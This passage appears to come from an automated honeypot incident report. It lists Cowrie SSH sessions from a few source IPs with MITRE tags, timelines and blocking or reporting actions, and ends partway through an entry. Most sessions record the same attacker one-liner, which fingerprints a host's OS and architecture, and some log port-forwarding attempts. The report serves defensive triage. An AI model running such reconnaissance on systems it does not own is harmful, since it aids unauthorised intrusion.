| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:46:49` | `cowrie.session.connect` |
| `2026-08-16 01:46:50` | `cowrie.client.version` |
| `2026-08-16 01:46:50` | `cowrie.client.kex` |
| `2026-08-16 01:46:55` | `cowrie.login.success` |
| `2026-08-16 01:46:58` | `cowrie.session.params` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.success` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:58` | `cowrie.command.input` |
| `2026-08-16 01:46:59` | `cowrie.log.closed` |
| `2026-08-16 01:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f1c22a3d55

| Field | Detail |
|---|---|
| **Source IP** | `220.178.246[.]43` |
| **First Seen** | 2026-08-16 01:47 |
| **Last Seen** | 2026-08-16 01:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:47:02` | `cowrie.session.connect` |
| `2026-08-16 01:47:02` | `cowrie.client.version` |
| `2026-08-16 01:47:02` | `cowrie.client.kex` |
| `2026-08-16 01:47:05` | `cowrie.login.success` |
| `2026-08-16 01:47:06` | `cowrie.direct-tcpip.request` |
| `2026-08-16 01:47:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.246[.]43` to AbuseIPDB if not already reported
- [ ] Block `220.178.246[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ef54bf05d6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:47 |
| **Last Seen** | 2026-08-16 01:47 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:47:48` | `cowrie.session.connect` |
| `2026-08-16 01:47:49` | `cowrie.client.version` |
| `2026-08-16 01:47:49` | `cowrie.client.kex` |
| `2026-08-16 01:47:54` | `cowrie.login.success` |
| `2026-08-16 01:47:57` | `cowrie.session.params` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.success` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:57` | `cowrie.command.input` |
| `2026-08-16 01:47:58` | `cowrie.log.closed` |
| `2026-08-16 01:47:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54bafa628d57

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:48 |
| **Last Seen** | 2026-08-16 01:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:48:51` | `cowrie.session.connect` |
| `2026-08-16 01:48:52` | `cowrie.client.version` |
| `2026-08-16 01:48:52` | `cowrie.client.kex` |
| `2026-08-16 01:48:55` | `cowrie.login.success` |
| `2026-08-16 01:48:58` | `cowrie.session.params` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.success` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:48:58` | `cowrie.command.input` |
| `2026-08-16 01:49:00` | `cowrie.log.closed` |
| `2026-08-16 01:49:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-029f3198f6ee

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:49 |
| **Last Seen** | 2026-08-16 01:50 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:49:51` | `cowrie.session.connect` |
| `2026-08-16 01:49:52` | `cowrie.client.version` |
| `2026-08-16 01:49:52` | `cowrie.client.kex` |
| `2026-08-16 01:49:56` | `cowrie.login.success` |
| `2026-08-16 01:49:59` | `cowrie.session.params` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.success` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:49:59` | `cowrie.command.input` |
| `2026-08-16 01:50:00` | `cowrie.log.closed` |
| `2026-08-16 01:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86794600f066

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:50 |
| **Last Seen** | 2026-08-16 01:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:50:50` | `cowrie.session.connect` |
| `2026-08-16 01:50:51` | `cowrie.client.version` |
| `2026-08-16 01:50:51` | `cowrie.client.kex` |
| `2026-08-16 01:50:56` | `cowrie.login.success` |
| `2026-08-16 01:50:58` | `cowrie.session.params` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.success` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:58` | `cowrie.command.input` |
| `2026-08-16 01:50:59` | `cowrie.log.closed` |
| `2026-08-16 01:51:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77a492f8348f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:51 |
| **Last Seen** | 2026-08-16 01:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:51:52` | `cowrie.session.connect` |
| `2026-08-16 01:51:53` | `cowrie.client.version` |
| `2026-08-16 01:51:53` | `cowrie.client.kex` |
| `2026-08-16 01:51:56` | `cowrie.login.success` |
| `2026-08-16 01:51:58` | `cowrie.session.params` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.success` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:58` | `cowrie.command.input` |
| `2026-08-16 01:51:59` | `cowrie.log.closed` |
| `2026-08-16 01:52:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0bd3b132e6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:52 |
| **Last Seen** | 2026-08-16 01:53 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:52:55` | `cowrie.session.connect` |
| `2026-08-16 01:52:56` | `cowrie.client.version` |
| `2026-08-16 01:52:56` | `cowrie.client.kex` |
| `2026-08-16 01:53:00` | `cowrie.login.success` |
| `2026-08-16 01:53:03` | `cowrie.session.params` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.success` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:03` | `cowrie.command.input` |
| `2026-08-16 01:53:04` | `cowrie.log.closed` |
| `2026-08-16 01:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5eb2274d6e8

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:53 |
| **Last Seen** | 2026-08-16 01:54 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:53:56` | `cowrie.session.connect` |
| `2026-08-16 01:53:57` | `cowrie.client.version` |
| `2026-08-16 01:53:57` | `cowrie.client.kex` |
| `2026-08-16 01:54:01` | `cowrie.login.success` |
| `2026-08-16 01:54:04` | `cowrie.session.params` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.success` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:04` | `cowrie.command.input` |
| `2026-08-16 01:54:05` | `cowrie.log.closed` |
| `2026-08-16 01:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b6879479403

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:54 |
| **Last Seen** | 2026-08-16 01:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:54:54` | `cowrie.session.connect` |
| `2026-08-16 01:54:55` | `cowrie.client.version` |
| `2026-08-16 01:54:55` | `cowrie.client.kex` |
| `2026-08-16 01:54:59` | `cowrie.login.success` |
| `2026-08-16 01:55:02` | `cowrie.session.params` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.success` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:02` | `cowrie.command.input` |
| `2026-08-16 01:55:03` | `cowrie.log.closed` |
| `2026-08-16 01:55:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d72e1858f065

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 01:55 |
| **Last Seen** | 2026-08-16 01:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:55:37` | `cowrie.session.connect` |
| `2026-08-16 01:55:37` | `cowrie.client.version` |
| `2026-08-16 01:55:37` | `cowrie.client.kex` |
| `2026-08-16 01:55:38` | `cowrie.login.success` |
| `2026-08-16 01:55:39` | `cowrie.session.params` |
| `2026-08-16 01:55:39` | `cowrie.command.input` |
| `2026-08-16 01:55:39` | `cowrie.log.closed` |
| `2026-08-16 01:55:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83638ae3d9ee

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:55 |
| **Last Seen** | 2026-08-16 01:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:55:52` | `cowrie.session.connect` |
| `2026-08-16 01:55:53` | `cowrie.client.version` |
| `2026-08-16 01:55:53` | `cowrie.client.kex` |
| `2026-08-16 01:55:58` | `cowrie.login.success` |
| `2026-08-16 01:56:01` | `cowrie.session.params` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.success` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:01` | `cowrie.command.input` |
| `2026-08-16 01:56:02` | `cowrie.log.closed` |
| `2026-08-16 01:56:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ccd687cae53

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 01:56 |
| **Last Seen** | 2026-08-16 01:57 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:56:51` | `cowrie.session.connect` |
| `2026-08-16 01:56:52` | `cowrie.client.version` |
| `2026-08-16 01:56:52` | `cowrie.client.kex` |
| `2026-08-16 01:56:57` | `cowrie.login.success` |
| `2026-08-16 01:57:00` | `cowrie.session.params` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.success` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:00` | `cowrie.command.input` |
| `2026-08-16 01:57:02` | `cowrie.log.closed` |
| `2026-08-16 01:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f2779ed8b05

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-08-16 01:57 |
| **Last Seen** | 2026-08-16 01:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 01:57:22` | `cowrie.session.connect` |
| `2026-08-16 01:57:23` | `cowrie.client.version` |
| `2026-08-16 01:57:23` | `cowrie.client.kex` |
